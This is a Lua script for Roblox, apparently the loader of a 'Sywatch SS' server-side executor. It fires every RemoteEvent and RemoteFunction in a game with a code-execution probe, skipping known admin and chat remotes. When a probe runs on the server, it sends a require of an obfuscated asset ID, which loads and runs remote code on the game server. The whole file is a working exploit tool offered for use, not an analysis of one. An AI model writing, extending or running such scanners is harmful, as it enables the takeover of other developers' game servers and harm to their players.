return function(STATEMENT_TRUE, STATEMENT_FALSE)
	function notify(text)
		game:GetService("StarterGui"):SetCore("SendNotification", {Title="Sywatch SS",Duration=5,Text=text})
	end
	function debug(Text, LVL)
		local func = print
		if (LVL == 1) then
			func = print
		end
		if (LVL == 2) then
			func = error
		end
		if (LVL == 3) then
			func = warn
		end
		func("Sywatch SS: " .. Text)
	end
	function runRemote(v, data)
		if v:IsA("RemoteEvent") then
			v:FireServer(data)
		elseif v:IsA("RemoteFunction") then
			spawn(function()
				v:InvokeServer(data)
			end)
		end
	end
	function generateName(lenght)
		local alphabet = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"}
		local text = ""
		for i = 1, lenght do
			text = text .. alphabet[math.random(1, #alphabet)]
		end
		return text
	end
	function findRemote()
		local remotes = {}
		local protected_backdoor = game:GetService("ReplicatedStorage"):FindFirstChild("Sywatch SS" .. ((game.PlaceId / 7777) * 6009 * game.PlaceId))
		if (protected_backdoor and protected_backdoor:IsA("RemoteFunction")) then
			while true do
				code = generateName(math.random(12, 30))
				if not remotes[code] then
					break
				end
			end
			spawn(function()
				protected_backdoor:InvokeServer("Sywatch SS", "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
			end)
			remotes[code] = protected_backdoor
		end
		for i, v in game:GetDescendants() do
			if not v:IsA("RemoteEvent") then
				if not v:IsA("RemoteFunction") then
					continue
				end
			end
			if (string.split(v:GetFullName(), ".")[1] == "RobloxReplicatedStorage") then
				debug("Roblox Replicated Storage (" .. v.Name .. ")", 1)
				continue
			end
			if ((v.Parent == game:GetService("ReplicatedStorage")) or (v.Parent.Parent == game:GetService("ReplicatedStorage")) or (v.Parent.Parent.Parent == game:GetService("ReplicatedStorage"))) then
				if (v:FindFirstChild("__FUNCTION") or (v.Name == "__FUNCTION")) then
					debug("Adonis filter detected (" .. v.Name .. ")", 1)
					continue
				end
				if ((v.Parent.Parent.Name == "HDAdminClient") and (v.Parent.Name == "Signals")) then
					debug("HD Admin (" .. v.Name .. ")", 1)
					continue
				end
				if (v.Parent.Name == "DefaultChatSystemChatEvents") then
					debug("Chat event (" .. v.Name .. ")", 1)
					continue
				end
			end
			while true do
				code = generateName(math.random(12, 30))
				if not remotes[code] then
					break
				end
			end
			runRemote(v, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
			remotes[code] = v
			debug("Sended Backdoor '" .. v:GetFullName() .. "'", 1)
		end
		for i = 1, 100 do
			for i, v in remotes do
				if game:GetService("Workspace"):FindFirstChild(i) then
					backdoor = true
					AutoRun = true
					debug(v:GetFullName(), 3)
					runRemote(v, "require(171016405.1884*69)")
					return true
				end
			end
		end
		return false
	end
	if findRemote() then
		if STATEMENT_TRUE then pcall(STATEMENT_TRUE) end
	else
		if STATEMENT_FALSE then pcall(STATEMENT_FALSE) end
	end
end
